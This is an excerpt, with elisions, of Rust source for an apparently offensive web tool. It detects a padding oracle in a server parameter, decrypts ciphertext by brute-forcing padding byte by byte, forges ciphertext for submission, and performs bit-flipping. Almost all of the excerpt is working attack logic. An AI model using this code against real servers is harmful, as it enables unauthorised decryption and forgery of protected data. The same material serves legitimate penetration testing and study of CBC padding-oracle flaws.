...
pub async fn detect(
    ...
    println!(
        "  {} Baseline:     status={} size={}",
        "*".cyan(),
        baseline.0,
        baseline.1
    );
    println!(
        "  {} Valid padding: status={} size={}",
        "*".cyan(),
        valid_pad.0,
        valid_pad.1
    );
    println!(
        "  {} Bad padding:   status={} size={}",
        "*".cyan(),
        bad_pad.0,
        bad_pad.1
    );
    ...
    if diff_status || diff_size || diff_body {
        println!(
            "\n{} Padding oracle DETECTED! Server differentiates between valid/invalid padding.",
            "[!]".red().bold()
        );
        if diff_status {
            println!("  {} Different HTTP status codes", "*".red());
        }
        if diff_size {
            println!(
                "  {} Different response sizes ({} vs {})",
                "*".red(),
                valid_pad.1,
                bad_pad.1
            );
        ...
        if diff_body {
            println!("  {} Different response bodies", "*".red());
        }
    } else {
        println!(
            "\n{} No padding oracle detected — responses are identical.",
            "[-]".green().bold()
        );
    }
    Ok(())
...
pub async fn decrypt(
    ...
    if ct_bytes.len() < 32 {
        println!(
            "{} Ciphertext too short — need at least 2 blocks (32 bytes).",
            "[-]".red().bold()
        );
        return Ok(());
    }
    ...
    for block_idx in (1..num_blocks).rev() {
        ...
        for pad_val in 1..=16 {
            ...
            for guess in 0..=255 {
                ...
                test_ct[..block_size]
                    .copy_from_slice(&ct_bytes[prev_block_start..prev_block_start + block_size]);
                test_ct[target_block_start - prev_block_start..].copy_from_slice(
                    &ct_bytes[target_block_start..target_block_start + block_size],
                );
                ...
                if resp.0 == 200 || (resp.0 != 500 && resp.0 != 400) {
                    ...
                    block_plain[byte_pos] =
                        intermediate[byte_pos] ^ ct_bytes[prev_block_start + byte_pos];
                    found = true;
                    break;
                }
            }
            ...
            if !found {
                println!(
                    "  {} Block {} byte {} — no valid padding found",
                    "*".red(),
                    block_idx,
                    byte_pos
                );
        ...
        decrypted = block_plain.iter().copied().chain(decrypted).collect();
    }
...
pub async fn encrypt(
    ...
    println!(
        "{} Padding Oracle Encryption (Bit-Flipping)",
        "[*]".cyan().bold()
    );
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {} param: {}", "[*]".cyan().bold(), url, param);
    ...
    for block_idx in (0..num_blocks).rev() {
        ...
        for pad_val in 1..=16 {
            ...
            for guess in 0..=255 {
                let mut test_ct = vec![0u8; block_size * 2];
                test_ct[..block_size].copy_from_slice(
                    &crafted_ct[block_idx * block_size..(block_idx + 1) * block_size],
                );
    ...
    println!(
        "{} Submit this as the {} parameter to get the server to decrypt to your plaintext.",
        "[*]".cyan().bold(),
        param
    );
    Ok(())
...
pub async fn bit(
    ...
    for (name, byte_pos, xor_val) in &targets {
        ...
        let tag = if changed {
            format!("status={} size={}", resp.0, resp.1)
        } else {
            format!("status={}", resp.0)
        };
        println!("  {} {:35} {}", "*".cyan(), name, tag);
    }

    println!(
        "\n{} Bit-flipping modifies the previous block's plaintext by XORing the ciphertext.",
        "[*]".cyan().bold()
    );
    Ok(())
}
